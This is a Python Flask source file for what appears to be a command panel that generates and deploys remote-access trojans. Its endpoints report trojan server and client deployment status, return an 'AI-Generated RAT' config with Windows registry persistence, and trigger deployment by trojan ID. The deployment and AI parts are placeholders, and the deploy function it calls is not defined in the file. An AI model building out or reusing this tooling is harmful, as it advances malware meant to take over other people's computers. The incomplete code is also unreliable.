from flask import Blueprint, request, jsonify
from backend.app import db, require_api_key
from backend.models.trojan_server import TrojanServer
from backend.models.trojan_client import TrojanClient
import logging
import subprocess
import time

logger = logging.getLogger(__name__)

trojan_bp = Blueprint('trojan', __name__, url_prefix='/api/trojan')

@trojan_bp.route('/servers/<int:server_id>/status', methods=['GET'])
@require_api_key
def get_trojan_server_status(server_id):
    server = TrojanServer.query.get_or_404(server_id)
    return jsonify({'id': server.id, 'server_ip': server.server_ip, 'server_port': server.server_port,
                    'encryption_method': server.encryption_method, 'deployment_method': server.deployment_method,
                    'deployment_status': server.deployment_status, 'deployment_message': server.deployment_message,
                    'deployment_details': server.deployment_details})

@trojan_bp.route('/clients/<int:client_id>/status', methods=['GET'])
@require_api_key
def get_trojan_client_status(client_id):
    client = TrojanClient.query.get_or_404(client_id)
    return jsonify({'id': client.id, 'config': client.config, 'deployment_method': client.deployment_method,
                    'deployment_status': client.deployment_status, 'deployment_message': client.deployment_message,
                    'deployment_details': client.deployment_details})

@trojan_bp.route('/generate', methods=['POST'])
@require_api_key
def generate_rat_config():
    data = request.get_json()
    goal = data.get('goal')
    constraints = data.get('constraints', {})

    # Placeholder for AI logic (replace with actual AI integration)
    logger.info(f"Generating RAT config with AI. Goal: {goal}, Constraints: {constraints}")
    ai_config = {
        'name': f'AI-Generated RAT for {goal}',
        'description': f'RAT generated by AI with goal: {goal}',
        'target_os': 'Windows',
        'persistence_method': 'Registry',
        'payload_id': 1,  # Placeholder, you'd need to select a payload
        'deployment_method_id': 1, # Placeholder, you'd need to select a deployment method
        'config': {'key': 'value'}
    }
    logger.info(f"AI generated config: {ai_config}")
    return jsonify(ai_config)

@trojan_bp.route('/deploy/<int:trojan_id>', methods=['POST'])
@require_api_key
def deploy_trojan_api(trojan_id):
    try:
        # Placeholder for deployment logic (replace with actual deployment)
        logger.info(f"Deploying trojan with ID: {trojan_id}")
        deployment_feedback = deploy_trojan(trojan_id)
        logger.info(f"Trojan {trojan_id} deployed successfully.")
        return jsonify({'message': 'Trojan deployed successfully', 'feedback': deployment_feedback})
    except subprocess.CalledProcessError as e:
        logger.error(f"Subprocess error deploying trojan: {str(e)}")
        return jsonify({'message': f'Subprocess error deploying trojan: {str(e)}', 'error': str(e)}), 500
    except Exception as e:
        logger.error(f"Error deploying trojan: {str(e)}")
        return jsonify({'message': f'Error deploying trojan: {str(e)}', 'error': str(e)}), 500
